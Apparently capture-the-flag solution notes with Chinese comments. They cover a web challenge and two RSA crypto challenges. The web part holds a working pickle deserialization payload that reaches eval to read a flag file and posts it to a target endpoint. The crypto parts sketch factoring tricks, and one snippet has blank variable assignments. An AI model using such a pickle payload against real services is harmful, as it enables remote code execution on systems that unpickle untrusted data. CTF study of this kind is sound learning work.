## WEB

### pickle 反序列化
```python
import pickle, base64, requests

# pickle payload
a = b'cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\'get\'\ntRp2\n0cbuiltins\nglobals\n(tRp3\n0g2\n(g3\nS\'builtins\'\ntRp4\n0g0\n(g4\nS\'eval\'\ntRp5\n0g5\n(S\'open("/f1ag").read()\'\ntR.'
info = base64.b64encode(a)
requests.post("http://.../deserialize", data={"payload": info, "token": "super_secret_key"})
```
- `builtins.getattr` + `dict.get('eval')` + `open('/f1ag').read()`

## Crypto

### RSA-1 (math trick)
```python
from hashlib import md5
import sympy
info = 
n = 
e = 68719476737
k = (e*info - 1) // n
add = (e*info - 1 - k*n - k) // (e - k)
p, q = sympy.symbols("p, q")
print(sympy.solve([p + q - add, p*q - n], [p, q]))
```
- 关键：`e*info - 1 = k*(n+1) + (e-k)*add`
- 解方程组

### RSA-2 (multi-prime)

p = gmpy2.gcd(a0, a1)

- 多素数 RSA（3 个素数 p/q/r）
- 共享因子 gcd 攻击
